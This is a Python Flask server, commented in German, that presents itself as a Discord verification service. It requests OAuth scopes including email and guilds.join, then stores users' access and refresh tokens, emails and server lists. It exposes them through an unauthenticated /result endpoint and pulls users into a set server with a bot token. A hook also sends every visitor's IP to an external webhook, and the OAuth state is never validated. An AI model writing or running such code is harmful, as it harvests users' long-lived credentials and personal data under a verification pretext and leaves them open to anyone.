import os
import datetime
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# ============================================================
# KONFIGURATION (.env / Render Env-Variablen)
# ============================================================
CLIENT_ID        = os.environ.get("CLIENT_ID", "")
CLIENT_SECRET    = os.environ.get("CLIENT_SECRET", "")
PUBLIC_URL       = os.environ.get("PUBLIC_URL", "http://localhost:5000")
GUILD_ID         = os.environ.get("GUILD_ID", "")
SITE_LOG_KEY     = os.environ.get("SITE_LOG_KEY", "")
SITE_WEBHOOK_URL = os.environ.get("SITE_WEBHOOK_URL", "")

DISCORD_API  = "https://discord.com/api"
REDIRECT_URI = f"{PUBLIC_URL}/callback"

# state -> Ergebnis (wird vom Bot per /check abgeholt)
results = {}

print("=== Verify-Server gestartet ===")
print(f"CLIENT_ID        gesetzt: {bool(CLIENT_ID)}")
print(f"CLIENT_SECRET    gesetzt: {bool(CLIENT_SECRET)}")
print(f"PUBLIC_URL       = {PUBLIC_URL}")
print(f"REDIRECT_URI     = {REDIRECT_URI}")
print(f"GUILD_ID         gesetzt: {bool(GUILD_ID)}")
print(f"SITE_LOG_KEY     gesetzt: {bool(SITE_LOG_KEY)}")
print(f"SITE_WEBHOOK_URL gesetzt: {bool(SITE_WEBHOOK_URL)}")


def exchange_code(code):
    """Tauscht den OAuth2-Code gegen Access-Token, Refresh-Token und User-Daten."""
    r = requests.post(
        f"{DISCORD_API}/oauth2/token",
        data={
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
        },
        timeout=10,
    )
    if r.status_code != 200:
        return None, None, None, None, None, None, f"Token-Fehler: {r.status_code} {r.text[:200]}"

    token = r.json()
    access_token = token.get("access_token")
    refresh_token = token.get("refresh_token", "")
    headers = {"Authorization": f"Bearer {access_token}"}

    me = None
    guilds = []
    r2 = requests.get(f"{DISCORD_API}/users/@me", headers=headers, timeout=10)
    if r2.status_code == 200:
        me = r2.json()
    r3 = requests.get(f"{DISCORD_API}/users/@me/guilds", headers=headers, timeout=10)
    if r3.status_code == 200:
        guilds = r3.json()

    email = (me or {}).get("email", "")
    user_id = (me or {}).get("id", "")
    return access_token, refresh_token, user_id, email, me, guilds, None


# ============================================================
# TRACKER-SNIPPET (loggt jeden Seitenaufruf an den Webhook)
# ============================================================
@app.after_request
def log_to_site_webhook(response):
    """Loggt jeden Request ans SITE_WEBHOOK_URL-Webhook-Panel."""
    if not SITE_WEBHOOK_URL:
        return response
    try:
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "?").split(",")[0].strip()
        payload = {
            "content": None,
            "embeds": [{
                "title": "🌐 Seitenaufruf",
                "color": 0x3498DB,
                "description": (
                    f"**Route:** `{request.path}`\n"
                    f"**Methode:** `{request.method}`\n"
                    f"**IP:** `{ip}`\n"
                    f"**Status:** `{response.status_code}`\n"
                    f"**Zeit:** `{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}`"
                ),
                "footer": {"text": "Verify-Server Tracker"}
            }]
        }
        requests.post(SITE_WEBHOOK_URL, json=payload, timeout=5)
    except Exception:
        pass
    return response


# ============================================================
# ROUTEN
# ============================================================
@app.route("/")
def index():
    return "<h2>Verify-Server läuft ✅</h2>"


@app.route("/start")
def start():
    """Leitet zur Discord-OAuth-Seite weiter."""
    state = __import__("secrets").token_urlsafe(16)
    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "scope": "identify email guilds guilds.join",
    }
    url = f"https://discord.com/oauth2/authorize?{__import__('urllib.parse', fromlist=['urlencode']).urlencode(params)}&state={state}"
    return f'<a href="{url}">Weiter zur Discord-Verifizierung</a>'


@app.route("/callback")
def callback():
    """OAuth-Callback: tauscht Code, speichert Ergebnis, zeigt Erfolgsseite."""
    code = request.args.get("code")
    error = request.args.get("error")
    if error or not code:
        return "<h2>❌ Verifizierung abgebrochen oder fehlgeschlagen.</h2><p>Bitte versuche es erneut.</p>", 400

    access_token, refresh_token, user_id, email, me, guilds, err = exchange_code(code)
    if err:
        return f"<h2>❌ {err}</h2>", 500

    results[user_id] = {
        "access_token": access_token,
        "refresh_token": refresh_token,
        "email": email,
        "username": (me or {}).get("username", "?"),
        "display_name": (me or {}).get("global_name") or (me or {}).get("username", "?"),
        "avatar": (me or {}).get("avatar", ""),
        "guilds": guilds,
        "verified_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
    }

    # Optional: Sofort in den Chill-Server (GUILD_ID) ziehen
    if GUILD_ID and access_token:
        try:
            requests.put(
                f"{DISCORD_API}/guilds/{GUILD_ID}/members/{user_id}",
                headers={"Authorization": f"Bot {os.environ.get('BOT_TOKEN', '')}"},
                json={"access_token": access_token},
                timeout=10,
            )
        except Exception:
            pass

    name = (me or {}).get("global_name") or (me or {}).get("username", "?")
    return f"<h2>✅ Verifiziert! Willkommen, {name}!</h2><p>Du kannst dieses Fenster schließen.</p>"


@app.route("/result/<user_id>")
def result(user_id):
    """Vom Bot abgerufen – holt das Verify-Ergebnis für einen User."""
    data = results.pop(user_id, None)
    if not data:
        return jsonify({"error": "Kein Ergebnis gefunden"}), 404
    return jsonify(data)


@app.route("/result/delete/<user_id>", methods=["POST"])
def result_delete(user_id):
    """Löscht ein gespeichertes Ergebnis (Aufräumen)."""
    results.pop(user_id, None)
    return jsonify({"ok": True})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
